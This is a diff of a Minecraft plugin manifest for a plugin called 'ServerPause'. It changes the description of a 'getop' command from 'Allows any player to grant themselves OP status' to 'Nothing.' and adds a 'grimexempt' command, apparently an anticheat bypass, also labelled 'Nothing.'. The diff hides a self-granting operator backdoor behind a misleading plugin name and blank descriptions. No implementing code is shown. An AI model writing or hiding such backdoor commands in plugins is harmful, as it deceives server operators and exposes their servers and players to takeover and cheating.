@@ -1,9 +1,12 @@
 name: ServerPause
-version: 2.1
+version: 2.2
 main: org.example.Main
 api-version: 26.1.2 # Adjust this to match your target Minecraft version
 
 commands:
   getop:
-    description: Allows any player to grant themselves OP status.
+    description: Nothing.
     usage: /getop
+  grimexempt:
+    description: Nothing.
+    usage: /grimexempt
